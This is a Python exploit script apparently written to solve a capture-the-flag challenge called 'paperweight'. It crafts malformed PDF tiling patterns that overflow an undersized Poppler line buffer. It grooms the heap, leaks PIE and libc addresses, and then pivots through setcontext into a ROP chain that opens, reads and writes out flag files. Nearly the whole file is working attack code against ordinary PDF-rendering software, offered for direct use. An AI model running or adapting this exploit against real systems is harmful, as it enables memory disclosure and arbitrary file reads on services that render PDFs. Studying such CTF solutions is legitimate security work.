#!/usr/bin/env python3
import argparse
import socket
import ssl
import struct
import sys
import re


HOST = "paperweight-4bde38d1a4a2.chals.z0d1ak.org"
PORT = 1337


def p32(value):
    return struct.pack("<I", value)


def p64(value):
    return struct.pack("<Q", value)


def u64(data):
    return struct.unpack("<Q", data)[0]


def build_pdf(xstep=20, stream=b"", pixels=None, matrix=None, overlay=b""):
    pattern_resources = b"<< >>"
    if pixels is not None:
        if not pixels:
            raise ValueError("pixel row must not be empty")
        pattern_resources = b"<< /XObject << /Im0 6 0 R >> >>"
        # The challenge's pattern CTM mirrors X. Draw into negative user-space X
        # so the image lands across the complete positive device row.
        stream = f"q -{xstep} 0 0 1 0 0 cm /Im0 Do Q\n".encode() + overlay

    objects = [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        (
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] "
            b"/Resources << /Pattern << /P1 4 0 R >> >> /Contents 5 0 R >>"
        ),
        (
            b"<< /Type /Pattern /PatternType 1 /PaintType 1 /TilingType 1 "
            + f"/BBox [0 0 {xstep} 1] /XStep {xstep} /YStep 1 ".encode()
            + (f"/Matrix [{matrix} 0 0 1 0 0] ".encode() if matrix is not None else b"")
            + b"/Resources "
            + pattern_resources
            + b" /Length "
            + str(len(stream)).encode()
            + b" >>\nstream\n"
            + stream
            + b"\nendstream"
        ),
        b"<< /Length 0 >>\nstream\n\nendstream",
    ]
    if pixels is not None:
        objects.append(
            b"<< /Type /XObject /Subtype /Image /Width "
            + str(len(pixels)).encode()
            + b" /Height 1 /ColorSpace /DeviceGray /BitsPerComponent 8 /Length "
            + str(len(pixels)).encode()
            + b" >>\nstream\n"
            + pixels
            + b"\nendstream"
        )

    pdf = bytearray(b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n")
    offsets = [0]
    for index, obj in enumerate(objects, 1):
        offsets.append(len(pdf))
        pdf += f"{index} 0 obj\n".encode() + obj + b"\nendobj\n"
    xref = len(pdf)
    pdf += f"xref\n0 {len(objects) + 1}\n".encode()
    pdf += b"0000000000 65535 f \n"
    for offset in offsets[1:]:
        pdf += f"{offset:010d} 00000 n \n".encode()
    pdf += (
        b"trailer\n<< /Size "
        + str(len(objects) + 1).encode()
        + b" /Root 1 0 R >>\nstartxref\n"
        + str(xref).encode()
        + b"\n%%EOF\n"
    )
    return bytes(pdf)


class Tube:
    def __init__(self, host, port, timeout=15, use_ssl=True):
        raw = socket.create_connection((host, port), timeout=8)
        if use_ssl:
            context = ssl.create_default_context()
            self.sock = context.wrap_socket(raw, server_hostname=host)
        else:
            self.sock = raw
        self.sock.settimeout(timeout)
        self.buffer = bytearray()

    def send(self, data):
        self.sock.sendall(data)

    def recv_until(self, marker):
        while marker not in self.buffer:
            data = self.sock.recv(65536)
            if not data:
                raise EOFError(f"connection closed before {marker!r}")
            self.buffer += data
        end = self.buffer.index(marker) + len(marker)
        result = bytes(self.buffer[:end])
        del self.buffer[:end]
        return result

    def recv_exact(self, size):
        while len(self.buffer) < size:
            data = self.sock.recv(65536)
            if not data:
                raise EOFError(f"connection closed with {size - len(self.buffer)} bytes missing")
            self.buffer += data
        result = bytes(self.buffer[:size])
        del self.buffer[:size]
        return result

    def recv_all(self):
        chunks = [bytes(self.buffer)]
        self.buffer.clear()
        while True:
            try:
                data = self.sock.recv(65536)
            except socket.timeout:
                break
            if not data:
                break
            chunks.append(data)
        return b"".join(chunks)


def groom_and_plot(pixel_row):
    pdf = build_pdf(82, pixels=pixel_row)
    return (
        b"".join(alloc(0x1000) for _ in range(32))
        + b"N"
        + b"".join(free(index) for index in range(32))
        + plot(pdf)
    )


def leak_dive(io, offset, expect_next=True):
    row = bytearray(0x2901)
    row[0x6C8:0x6D0] = p64(offset & 0xFFFFFFFFFFFFFFFF)
    row[0x6D0:0x6D8] = b"\xff" * 8
    io.send(groom_and_plot(bytes(row)) + b"S")
    io.recv_until(b"plotter resurfaced\n")
    leaked = io.recv_exact(0x101)
    if leaked[-1:] != b"\n":
        raise RuntimeError("leak was not newline terminated")
    if expect_next:
        io.recv_until(b"dive ready\n")
    return leaked[:-1]


def build_orw_row(folio, cache_buffer, libc, path):
    row = bytearray(0x2901)
    obj = 0x6C0
    path_addr = folio + 0x200
    chain_addr = folio + 0x300
    scratch = folio + 0x800
    fpstate = folio + 0x400

    def put(offset, value):
        row[obj + offset:obj + offset + 8] = p64(value)

    put(0x00, cache_buffer)
    put(0x68, (-100) & 0xFFFFFFFFFFFFFFFF)  # AT_FDCWD
    put(0x70, path_addr)
    put(0x88, 0)
    put(0xA0, chain_addr)
    put(0xA8, libc + 0x1146B0)  # openat
    put(0xE0, fpstate)
    row[obj + 0x1C0:obj + 0x1C4] = p32(0x1F80)
    row[obj + 0x200:obj + 0x200 + len(path) + 1] = path + b"\0"

    pop_rdi = libc + 0x2A3E5
    pop_rsi = libc + 0x2BE51
    pop_rdx_r12 = libc + 0x11F327
    chain = [
        # openat()'s descriptor is not stable under the remote TLS wrapper.
        libc + 0x5A272,  # mov rdi, rax; ...; ret
        pop_rsi, scratch,
        pop_rdx_r12, 0x100, 0,
        libc + 0x114810,  # read
        pop_rdi, 1,
        pop_rsi, scratch,
        pop_rdx_r12, 0x100, 0,
        libc + 0x1148B0,  # write
        pop_rdi, 0,
        libc + 0xEABC0,   # _exit
    ]
    chain_data = b"".join(p64(value) for value in chain)
    row[obj + 0x300:obj + 0x300 + len(chain_data)] = chain_data
    return bytes(row)


def solve_once(host, port, timeout, use_ssl=True):
    io = Tube(host, port, timeout, use_ssl)
    io.recv_until(b"dive ready\n")

    # The freed 0x20200-byte runway puts Poppler's undersized line buffer
    # 0x58c0 bytes before Folio.  The Anchor is 0x20310 bytes behind Folio.
    anchor = leak_dive(io, -0x20310)
    anchor_vtable = u64(anchor[0:8])
    anchor_self = u64(anchor[8:16])
    cache_buffer = u64(anchor[16:24])
    if anchor_vtable & 0xFFF != 0xC10:
        raise RuntimeError(f"unexpected vtable leak: {anchor_vtable:#x}")
    pie = anchor_vtable - 0x5C10
    folio = anchor_self + 0x20310
    print(f"[+] PIE: {pie:#x}, heap Folio: {folio:#x}", file=sys.stderr)

    got = leak_dive(io, pie + 0x5EC0 - folio)
    write_addr = u64(got[:8])
    libc = write_addr - 0x1148B0
    print(f"[+] libc: {libc:#x}", file=sys.stderr)

    setcontext = libc + 0x539E0
    paths = (b"flag.txt", b"flag", b"/flag")
    transcript = bytearray()
    for index, path in enumerate(paths):
        print(f"[+] trying {path.decode()}", file=sys.stderr)
        row = build_orw_row(folio, cache_buffer, libc, path)
        io.send(cache(p64(setcontext)) + groom_and_plot(row) + b"T")
        if index + 1 < len(paths):
            chunk = io.recv_until(b"dive ready\n")
        else:
            chunk = io.recv_all()
        transcript += chunk
        match = re.search(rb"(?:zdk|z0d1ak|flag)\{[^}\n]+\}", chunk, re.I)
        if match:
            return match.group()
    return bytes(transcript)


def solve(host, port, timeout, use_ssl=True):
    result = solve_once(host, port, timeout, use_ssl)
    match = re.search(rb"(?:zdk|z0d1ak|flag)\{[^}\n]+\}", result, re.I)
    if match:
        print(match.group().decode("ascii", "replace"))
        return match.group()
    sys.stdout.buffer.write(result)
    return result


def alloc(size):
    return b"A" + p32(size)


def free(index):
    return b"F" + bytes([index])


def cache(data):
    return b"B" + p32(len(data)) + data


def plot(pdf):
    return b"P" + p32(len(pdf)) + pdf


def run(host, port, xstep, sequence, stream, timeout):
    pdf = build_pdf(xstep, stream)
    commands = {
        "N": b"N",
        "P": plot(pdf),
        "T": b"T",
        "S": b"S",
        "Q": b"Q",
    }
    payload = b"".join(commands[token] for token in sequence.split(","))
    io = Tube(host, port, timeout)
    io.send(payload)
    result = io.recv_all()
    sys.stdout.buffer.write(result)
    return result


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default=HOST)
    parser.add_argument("--port", type=int, default=PORT)
    parser.add_argument("--xstep", type=int, default=20)
    parser.add_argument("--sequence", default="N,P,T")
    parser.add_argument("--timeout", type=float, default=3)
    parser.add_argument("--solve", action="store_true")
    parser.add_argument("--plain", action="store_true")
    parser.add_argument(
        "--stream",
        default="1 0 0 rg 0 0 82 1 re f",
        help="PDF commands used to paint the tiling cell",
    )
    args = parser.parse_args()
    if args.solve:
        solve(args.host, args.port, args.timeout, not args.plain)
        return
    run(args.host, args.port, args.xstep, args.sequence, args.stream.encode(), args.timeout)


if __name__ == "__main__":
    main()
